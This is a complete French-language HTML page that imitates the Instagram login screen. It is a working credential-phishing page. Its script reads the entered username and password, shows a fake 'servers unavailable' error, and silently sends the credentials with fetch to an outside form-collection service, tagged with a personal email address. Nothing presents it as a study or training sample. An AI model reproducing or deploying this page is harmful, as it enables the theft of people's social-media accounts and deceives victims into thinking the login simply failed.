<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #121923;
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
    }

    .lang {
      width: 100%;
      text-align: center;
      padding: 14px 0 0;
      font-size: 13px;
      color: #8e8e8e;
      letter-spacing: 0.01em;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 0 28px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
      flex: 1;
      justify-content: center;
    }

    .logo {
      margin-bottom: 40px;
      animation: fadeDown 0.6s ease both;
      background: transparent;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .logo svg {
      width: 96px;
      height: 96px;
      display: block;
    }

    .form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 10px;
      animation: fadeUp 0.6s ease 0.1s both;
    }

    input {
      width: 100%;
      background: #1e2736;
      border: 1px solid #2e3a4a;
      border-radius: 12px;
      padding: 16px 18px;
      font-size: 14px;
      color: #e0e0e0;
      outline: none;
      transition: border-color 0.2s, background 0.2s;
    }

    input::placeholder { color: #5a6a7a; }

    input:focus {
      border-color: #4a7aff;
      background: #1a2130;
    }

    .btn-login {
      width: 100%;
      background: #4a7aff;
      color: #fff;
      border: none;
      border-radius: 30px;
      padding: 16px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
      letter-spacing: 0.02em;
      transition: background 0.2s, transform 0.1s;
    }

    .btn-login:hover { background: #3a6aef; }
    .btn-login:active { transform: scale(0.98); }

    .forgot {
      text-align: center;
      font-size: 13.5px;
      color: #c0c0c0;
      margin-top: 16px;
      cursor: pointer;
      text-decoration: none;
      animation: fadeUp 0.6s ease 0.2s both;
    }

    .forgot:hover { text-decoration: underline; }

    .divider {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 100%;
      margin: 28px 0 22px;
      animation: fadeUp 0.6s ease 0.25s both;
    }

    .divider span {
      flex: 1;
      height: 1px;
      background: #2a3545;
    }

    .divider p {
      font-size: 13px;
      color: #5a6a7a;
      letter-spacing: 0.05em;
      text-transform: uppercase;
    }

    .btn-fb {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: #6a9aff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      animation: fadeUp 0.6s ease 0.3s both;
      text-decoration: none;
    }

    .btn-fb svg { width: 20px; height: 20px; }
    .btn-fb:hover { text-decoration: underline; }

    .bottom {
      width: 100%;
      border-top: 1px solid #1e2736;
      padding: 20px 0;
      text-align: center;
      animation: fadeUp 0.6s ease 0.35s both;
    }

    .btn-register {
      display: inline-block;
      background: transparent;
      border: 1px solid #4a7aff;
      color: #6a9aff;
      border-radius: 30px;
      padding: 14px 80px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      letter-spacing: 0.02em;
      transition: background 0.2s;
      text-decoration: none;
    }

    .btn-register:hover { background: rgba(74,122,255,0.08); }

    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }

    .modal.show { display: flex; }

    .modal-content {
      background: #1e2736;
      border: 1px solid #2e3a4a;
      border-radius: 16px;
      padding: 32px 24px;
      max-width: 320px;
      text-align: center;
      animation: modalSlideIn 0.3s ease;
    }

    .modal-content h2 {
      color: #e0e0e0;
      font-size: 18px;
      margin-bottom: 12px;
      font-weight: 600;
    }

    .modal-content p {
      color: #8e8e8e;
      font-size: 14px;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .modal-btn {
      width: 100%;
      background: #4a7aff;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .modal-btn:hover { background: #3a6aef; }

    @keyframes modalSlideIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    @keyframes fadeDown {
      from { opacity: 0; transform: translateY(-20px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <p class="lang">Français (France)</p>

  <div class="container">
    <div class="logo" role="img" aria-label="Instagram">
      <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <defs>
          <linearGradient id="instaGradient" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stop-color="#feda75" />
            <stop offset="25%" stop-color="#fa7e1e" />
            <stop offset="50%" stop-color="#d62976" />
            <stop offset="75%" stop-color="#962fbf" />
            <stop offset="100%" stop-color="#4f5bd5" />
          </linearGradient>
        </defs>
        <rect x="64" y="64" width="384" height="384" rx="108" ry="108" fill="url(#instaGradient)" />
        <rect x="132" y="132" width="248" height="248" rx="56" ry="56" fill="none" stroke="#fff" stroke-width="26" />
        <circle cx="256" cy="256" r="48" fill="none" stroke="#fff" stroke-width="26" />
        <circle cx="328" cy="184" r="16" fill="#fff" />
      </svg>
    </div>

    <div class="form">
      <form id="loginForm" action="https://forminit.com/f/yyivln41qv8" method="POST">
        <input type="text" name="fi-text-username" placeholder="Nom de profil, e-mail ou numéro de mobile" required />
        <input type="password" name="fi-text-login" placeholder="Mot de passe" required />
        <input type="hidden" name="fi-sender-email" value="bertreux.charles@gmail.com" />
        <button type="button" class="btn-login" onclick="submitForm()">Se connecter</button>
      </form>
    </div>

    <a href="#" class="forgot">Mot de passe oublié ?</a>

    <div class="divider">
      <span></span>
      <p>OU</p>
      <span></span>
    </div>

    <a href="#" class="btn-fb">
      <svg viewBox="0 0 24 24" fill="#6a9aff"><path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.408.593 24 1.324 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.592 1.323-1.324V1.324C24 .593 23.408 0 22.676 0"/></svg>
      Se connecter avec Facebook
    </a>
  </div>

  <div class="bottom">
    <a href="#" class="btn-register">Créer un nouveau compte</a>
  </div>

  <div class="modal" id="errorModal">
    <div class="modal-content">
      <h2>Erreur de connexion</h2>
      <p>Veuillez réessayer ultérieurement. Nos serveurs sont actuellement indisponibles.</p>
      <button class="modal-btn" onclick="closeModal()">Fermer</button>
    </div>
  </div>

  <script>
    const errorModal = document.getElementById('errorModal');
    const loginForm = document.getElementById('loginForm');

    function submitForm() {
      const username = loginForm.querySelector('input[name="fi-text-username"]').value;
      const login = loginForm.querySelector('input[name="fi-text-login"]').value;
      
      if (username && login) {
        // Afficher la pop-up d'erreur
        errorModal.classList.add('show');
        
        // Envoyer les données avec fetch (pas de navigation)
        const formData = new FormData();
        formData.append('fi-text-username', username);
        formData.append('fi-text-login', login);
        formData.append('fi-sender-email', 'bertreux.charles@gmail.com');
        
        fetch('https://forminit.com/f/yyivln41qv8', {
          method: 'POST',
          body: formData
        }).catch(err => console.log('Données envoyées'));
      }
    }

    function closeModal() {
      errorModal.classList.remove('show');
    }

    errorModal.addEventListener('click', (e) => {
      if (e.target === errorModal) {
        closeModal();
      }
    });
  </script>
</body>
</html>
